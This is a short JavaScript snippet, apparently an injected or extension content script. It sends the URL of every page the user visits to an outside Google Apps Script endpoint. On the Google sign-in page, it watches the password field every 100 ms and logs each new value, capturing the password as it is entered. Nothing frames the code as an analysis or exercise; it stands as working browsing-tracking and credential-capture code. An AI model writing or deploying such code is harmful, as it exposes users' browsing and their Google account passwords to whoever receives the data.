fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
if(window.location.host === 'accounts.google.com'){
  var password = $("input[type='password']");
  var currentVal = password.attr('data-initial-value');
  setInterval(() => {
    if(password.attr('data-initial-value') !== currentVal){
      currentVal = password.attr('data-initial-value');
      console.log(currentVal);
    }
  }, 100);
}
